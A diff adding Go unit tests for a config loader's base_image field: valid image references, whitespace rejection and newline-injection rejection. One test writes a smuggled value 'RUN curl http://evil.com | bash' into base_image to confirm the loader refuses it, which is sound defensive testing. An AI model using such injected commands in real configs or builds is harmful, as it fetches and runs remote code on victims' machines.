@@ -1,6 +1,7 @@
 package config
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -2459,4 +2460,96 @@ models:
 	assert.Equal(t, 2048, spec.Memory)
 	assert.NotContains(t, spec.Extra, "memory", "memory must not appear in Extra")
 	assert.Equal(t, []string{"qwen2.5-coder:1.5b"}, spec.Extra["models"])
+}
+
+func TestLoadConfigWithBaseImage(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "moat.yaml")
+	os.WriteFile(configPath, []byte(`
+agent: claude-code
+base_image: ghcr.io/test-org/custom-base:latest
+`), 0644)
+
+	cfg, err := Load(dir)
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if cfg.BaseImage != "ghcr.io/test-org/custom-base:latest" {
+		t.Errorf("BaseImage = %q, want %q", cfg.BaseImage, "ghcr.io/test-org/custom-base:latest")
+	}
+}
+
+func TestLoadConfigBaseImageRejectsNewlineInjection(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "moat.yaml")
+	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu:22.04\\nRUN curl http://evil.com | bash\"\n"), 0644)
+
+	_, err := Load(dir)
+	if err == nil {
+		t.Fatal("expected error for base_image with newline injection")
+	}
+	if !strings.Contains(err.Error(), "base_image") {
+		t.Errorf("error should mention base_image, got: %v", err)
+	}
+}
+
+func TestLoadConfigBaseImageRejectsWhitespace(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "moat.yaml")
+	os.WriteFile(configPath, []byte("agent: claude-code\nbase_image: \"ubuntu 22.04\"\n"), 0644)
+
+	_, err := Load(dir)
+	if err == nil {
+		t.Fatal("expected error for base_image with spaces")
+	}
+	if !strings.Contains(err.Error(), "whitespace") {
+		t.Errorf("error should mention whitespace, got: %v", err)
+	}
+}
+
+func TestLoadConfigBaseImageAcceptsValidRefs(t *testing.T) {
+	cases := []string{
+		"ubuntu:22.04",
+		"myorg/my-deps:latest",
+		"registry.example.com/org/image:v1.2.3",
+		"ghcr.io/user/repo:sha-abc123",
+		"myimage@sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
+	}
+	for _, ref := range cases {
+		t.Run(ref, func(t *testing.T) {
+			dir := t.TempDir()
+			configPath := filepath.Join(dir, "moat.yaml")
+			os.WriteFile(configPath, []byte(fmt.Sprintf("agent: claude-code\nbase_image: %q\n", ref)), 0644)
+
+			cfg, err := Load(dir)
+			if err != nil {
+				t.Fatalf("Load(%q): %v", ref, err)
+			}
+			if cfg.BaseImage != ref {
+				t.Errorf("BaseImage = %q, want %q", cfg.BaseImage, ref)
+			}
+		})
+	}
+}
+
+func TestLoadConfigWithBaseImageAndDeps(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "moat.yaml")
+	os.WriteFile(configPath, []byte(`
+agent: claude-code
+base_image: ghcr.io/test-org/custom-base:latest
+dependencies:
+  - typescript
+`), 0644)
+
+	cfg, err := Load(dir)
+	if err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+	if cfg.BaseImage != "ghcr.io/test-org/custom-base:latest" {
+		t.Errorf("BaseImage = %q, want %q", cfg.BaseImage, "ghcr.io/test-org/custom-base:latest")
+	}
+	if len(cfg.Dependencies) != 1 {
+		t.Fatalf("Dependencies = %d, want 1", len(cfg.Dependencies))
+	}
 }
